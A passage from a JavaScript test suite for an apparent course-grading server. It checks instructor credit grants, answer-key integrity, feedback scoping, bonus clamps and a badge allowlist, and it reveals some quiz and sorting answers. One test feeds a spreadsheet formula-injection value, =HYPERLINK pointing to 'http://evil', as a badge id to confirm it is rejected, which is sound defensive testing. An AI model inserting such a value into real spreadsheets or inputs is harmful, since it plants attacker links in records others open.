     Number(rec()[g.C.SXP - 1]) === 85 + 90, rec()[g.C.SXP - 1]);
  ok('T-GAP6 the grant is written to SecurityLog against the account that made it', (() => {
    const sec = g.sheet_(g.SH_SEC);
    const last = sec.getRange(sec.getLastRow(), 1, 1, 7).getValues()[0];
    return String(last[3]) === 'grantCredit' && String(last[4]) === 'GRANTED' &&
           /instructor@bulsu\.edu\.ph/.test(String(last[5]));
  })());
  ok('T-GAP7 the grant is recorded in Assessments as a credit, not as student work', (() => {
    const ash = g.sheet_(g.SH_ASSESS);
    const last = ash.getRange(ash.getLastRow(), 1, 1, 14).getValues()[0];
    return String(last[7]) === 'Instructor credit' && /GRANTED by instructor@/.test(String(last[12]));
  })());

  /* Guards */
  i = 0; prompts[0] = 'AAP-GAPS-0001'; prompts[1] = 'not-an-activity'; prompts[2] = 'GRANT';
  const xpBefore = Number(rec()[g.C.SXP - 1]);
  g.grantActivityCredit();
  ok('T-GAP8 an activity outside the answer key cannot be granted',
     Number(rec()[g.C.SXP - 1]) === xpBefore);
  i = 0; prompts[1] = 'm3-tabs';
  g.grantActivityCredit();
  ok('T-GAP9 granting the same activity twice pays nothing',
     Number(rec()[g.C.SXP - 1]) === xpBefore);
  i = 0; prompts[1] = 'f1-car'; prompts[2] = 'no';
  g.grantActivityCredit();
  ok('T-GAP10 the grant is refused without the typed confirmation',
     Number(rec()[g.C.SXP - 1]) === xpBefore);
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('ANSWER KEY INTEGRITY');
{
  const rt = fresh(); const g = rt.ctx;
  const all = g.allGates_();
  /* Both figures are read straight out of assets/content.js by extract-key.js,
     so this is a real drift check between the module and the server key. */
  ok('T-KEY1 all 22 gates from content.js are defined', all.length === 22, all.length);
  ok('T-KEY2 every gate has a positive XP value',
     all.every(x => g.gateSpec_(x).xp > 0));
  ok('T-KEY3 every gate maps to a module and lesson',
     all.every(x => { const s = g.gateSpec_(x); return (s.mod === 'm' || s.mod === 'f') && s.lesson > 0; }));
  ok('T-KEY4 graded gates are marked graded, claims are not',
     g.gateSpec_('m5-kc').graded === true && g.gateSpec_('m1-gal').graded === false);
  ok('T-KEY5 every badge id in the key is a real badge',
     all.every(x => { const s = g.gateSpec_(x);
       return [s.badgeOnClear, s.badgeOnPerfect, s.badgeOnClean].every(b => !b || g.BADGE_NAMES[b]); }));
  ok('T-KEY6 total available XP is unchanged from the original content (1620)',
     all.reduce((n, x) => n + g.gateSpec_(x).xp, 0) === 1620,
     all.reduce((n, x) => n + g.gateSpec_(x).xp, 0));
  ok('T-KEY7 clearing every gate reaches 100%', (() => {
    const st = { xp: 0, correct: 0, attempts: 0, streak: 0, run: 0, gates: {}, badges: {} };
    all.forEach(x => st.gates[x] = true);
    const d = g.derive_(st);
    return d.progress === 100 && d.lessons === Object.keys(g.lessonMap_()).length;
  })());
  /* The module still prints "+60 XP" on each activity header, straight out of
     content.js. That label must agree with what the server will actually pay,
     or students are promised one number and given another. This also catches an
     activity being added to the module without a key entry — which would leave
     it permanently uncompletable, since the server rejects unknown gates. */
  ok('T-KEY9 every activity in content.js matches the server key', (() => {
    const vm2 = require('vm'), fs2 = require('fs');
    const c = { console };
    vm2.createContext(c);
    vm2.runInContext(fs2.readFileSync('assets/content.js', 'utf8') + '\n;globalThis.CONTENT=CONTENT;', c);

    const drift = [];
    ['m', 'f'].forEach(k => (c.CONTENT[k].lessons || []).forEach(les => {
      (function walk(bs) {
        (bs || []).forEach(b => {
          if (b.blocks) walk(b.blocks);
          if (!b.gate) return;
          const spec = g.gateSpec_(b.gate);
          if (!spec) { drift.push(b.gate + ': in the module, missing from the key'); return; }
          if (Number(b.xp) !== Number(spec.xp)) {
            drift.push(b.gate + ': module advertises ' + b.xp + ' XP, key pays ' + spec.xp);
          }
          if (b.t === 'quiz' && b.opts.length !== spec.nOpts) {
            drift.push(b.gate + ': ' + b.opts.length + ' options shown, key expects ' + spec.nOpts);
          }
          if (b.t === 'boss' && b.questions.length !== spec.correct.length) {
            drift.push(b.gate + ': ' + b.questions.length + ' questions, key has ' + spec.correct.length);
          }
          if (b.t === 'sorter') {
            const ids = b.items.map(i => i.id).sort().join(',');
            const keyIds = Object.keys(spec.answers).sort().join(',');
            if (ids !== keyIds) drift.push(b.gate + ': item ids differ (' + ids + ' vs ' + keyIds + ')');
          }
          if (b.t === 'quiz' && (QUIZ_FEEDBACK_LEN(b.gate) !== b.opts.length)) {
            drift.push(b.gate + ': feedback lines do not match option count');
          }
        });
      })(les.blocks);
    }));
    function QUIZ_FEEDBACK_LEN(gate) { return (g.QUIZ_FEEDBACK[gate] || []).length; }
    return drift.length === 0 || drift;
  })() === true);

  ok('T-KEY8 clearing everything earns the scholar badge', (() => {
    const st = { xp: 0, correct: 0, attempts: 0, streak: 0, run: 0, gates: {}, badges: {} };
    all.forEach(x => st.gates[x] = true);
    g.awardCompletionBadges_(st);
    return st.badges.scholar === true && st.badges.midterm === true && st.badges.final === true;
  })());
}

/* ═══════════════════════════════════════════════════════════════════════ */
head('FEEDBACK SCOPING, BONUSES & BADGE ALLOWLIST');
{
  const rt = fresh(); const g = rt.ctx;
  const code = codeAt(g, 2), dev = 'dev-fb';
  const lg = login(g, code, dev, 'Feedback Test');
  const auth = { code, token: lg.token, deviceId: dev };

  /* Feedback must cover only what the student picked. */
  const wrong = g.apiGrade_(Object.assign({ gate: 'm5-kc', answer: 2 }, auth));
  ok('T-FB1 feedback is returned for the chosen option', wrong.fb && wrong.fb['2'] !== undefined, wrong.fb);
  ok('T-FB2 feedback covers exactly one option', Object.keys(wrong.fb).length === 1, Object.keys(wrong.fb));
  ok('T-FB3 the correct option\'s explanation is withheld', wrong.fb['6'] === undefined);
  ok('T-FB4 no "Correct!" text leaks on a wrong answer',
     JSON.stringify(wrong.fb).indexOf('Correct!') < 0, wrong.fb);

  const right = g.apiGrade_(Object.assign({ gate: 'm5-kc', answer: 6 }, auth));
  ok('T-FB5 the right answer does get its explanation',
     right.fb['6'] && right.fb['6'].indexOf('Correct!') > 0);

  const multi = g.apiGrade_(Object.assign({ gate: 'm2-kc', answer: [0, 3] }, auth));
  ok('T-FB6 multi-select returns feedback for both picks only',
     Object.keys(multi.fb).sort().join(',') === '0,3', Object.keys(multi.fb));

  /* First-try bonus is now something the server establishes. */
  const rt2 = fresh(); const g2 = rt2.ctx;
  const c2 = codeAt(g2, 2), d2 = 'dev-bonus';
  const l2 = login(g2, c2, d2, 'Bonus Test');
  const a2 = { code: c2, token: l2.token, deviceId: d2 };
  const perfect = { sunset: 'nature', banaue: 'art', 'ai-img': 'art', crush: 'nature' };

  const cleanRun = g2.apiGrade_(Object.assign({ gate: 'm2-dnd', answer: perfect }, a2));
  ok('T-BON1 a first-try sorter pays 60 + 20 bonus', cleanRun.xpAwarded === 80, cleanRun.xpAwarded);
  ok('T-BON2 and earns Clean Sort', cleanRun.state.badges.indexOf('sorter') >= 0);

  const messy = { potter: 'artist', painter: 'artisan', photographer: 'artisan', buntal: 'artist' };
  g2.apiGrade_(Object.assign({ gate: 'm4-dnd', answer: messy }, a2));            // a miss first
  const second = g2.apiGrade_(Object.assign({ gate: 'm4-dnd',
    answer: { potter: 'artisan', painter: 'artist', photographer: 'artist', buntal: 'artisan' } }, a2));
  ok('T-BON3 a second-try sorter pays the base 60 only', second.xpAwarded === 60, second.xpAwarded);
  ok('T-BON4 and does NOT earn Clean Sort',
     second.state.badges.filter(x => x === 'sorter').length ===
     cleanRun.state.badges.filter(x => x === 'sorter').length);

  /* Match bonuses are clamped to the two values the module could produce. */
  const clean = g2.apiGrade_(Object.assign({ gate: 'm3-match', answer: null, clean: true,
                                             badges: ['matchmaker'] }, a2));
  ok('T-BON5 a clean match pays 70 + 30', clean.xpAwarded === 100, clean.xpAwarded);
  ok('T-BON6 and earns the allowlisted Matchmaker badge',
     clean.state.badges.indexOf('matchmaker') >= 0);

  const messyMatch = g2.apiGrade_(Object.assign({ gate: 'f1-match', answer: null, clean: false }, a2));
  ok('T-BON7 a messy match pays 70 + 15', messyMatch.xpAwarded === 85, messyMatch.xpAwarded);
  ok('T-BON8 an absurd clean flag cannot buy more than the clamp',
     g2.apiGrade_(Object.assign({ gate: 'f2-sim', answer: null, clean: 9999 }, a2)).xpAwarded === 100);

  /* Badge allowlist. */
  const greedy = g2.apiGrade_(Object.assign({ gate: 'f3-shot', answer: null,
    badges: ['scholar', 'midterm', 'final', 'perfect-boss', 'boss'] }, a2));
  ok('T-BAD1 an activity cannot hand out badges it does not own',
     ['scholar', 'midterm', 'final', 'perfect-boss', 'boss']
       .every(x => greedy.state.badges.indexOf(x) < 0), greedy.state.badges);
  const invented = g2.apiGrade_(Object.assign({ gate: 'f3-angle', answer: null,
    badges: ['=HYPERLINK("http://evil")', 'not-a-badge'] }, a2));
  ok('T-BAD2 invented badge ids are dropped',
     invented.state.badges.every(x => g2.BADGE_NAMES[x] !== undefined), invented.state.badges);
  ok('T-BAD3 the Badge List cell holds only real badge names',
     String(col(g2, c2, 'BADGE_L')).split(', ').filter(Boolean)
       .every(n => Object.keys(g2.BADGE_NAMES).some(k => g2.BADGE_NAMES[k] === n)),
     col(g2, c2, 'BADGE_L'));
}

/* ═══════════════════════════════════════════════════════════════════════ */
console.log('\n' + '═'.repeat(70));
console.log('  ' + pass + ' passed, ' + fail + ' failed');
if (fail) { console.log('\n  Failing:'); failures.forEach(f => console.log('   • ' + f)); }
console.log('═'.repeat(70));
process.exit(fail ? 1 : 0);
